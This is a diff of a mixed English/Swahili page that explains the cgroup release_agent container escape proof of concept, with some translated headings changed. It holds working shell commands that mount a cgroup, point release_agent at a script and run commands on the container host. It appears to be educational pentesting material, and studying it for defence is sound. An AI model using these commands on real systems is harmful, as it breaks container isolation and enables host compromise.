@@ -28,7 +28,7 @@ $1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
 ```
 The proof of concept (PoC) demonstrates a method to exploit cgroups by creating a `release_agent` file and triggering its invocation to execute arbitrary commands on the container host. Here's a breakdown of the steps involved:
 
-1. **Tayarisha Mazingira:**
+1. **Prepare the Environment:**
 * A directory `/tmp/cgrp` is created to serve as a mount point for the cgroup.
 * The RDMA cgroup controller is mounted to this directory. In case of absence of the RDMA controller, it's suggested to use the `memory` cgroup controller as an alternative.
 ```shell
@@ -47,8 +47,8 @@ echo 1 > /tmp/cgrp/x/notify_on_release
 host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
 echo "$host_path/cmd" > /tmp/cgrp/release_agent
 ```
-4. **Create and Configure the /cmd Script:**
-* Skripti ya /cmd inaundwa ndani ya kontena na inasanidiwa kutekeleza ps aux, ikielekeza matokeo kwenye faili linaloitwa /output ndani ya kontena. Njia kamili ya /output kwenye mwenyeji imeainishwa.
+4. **Unda na Sanidi Skripti ya /cmd:**
+* Skripti ya /cmd inaundwa ndani ya kontena na inasanidiwa kutekeleza ps aux, ikielekeza matokeo kwenye faili lililo na jina /output ndani ya kontena. Njia kamili ya /output kwenye mwenyeji imeainishwa.
 ```shell
 echo '#!/bin/sh' > /cmd
 echo "ps aux > $host_path/output" >> /cmd
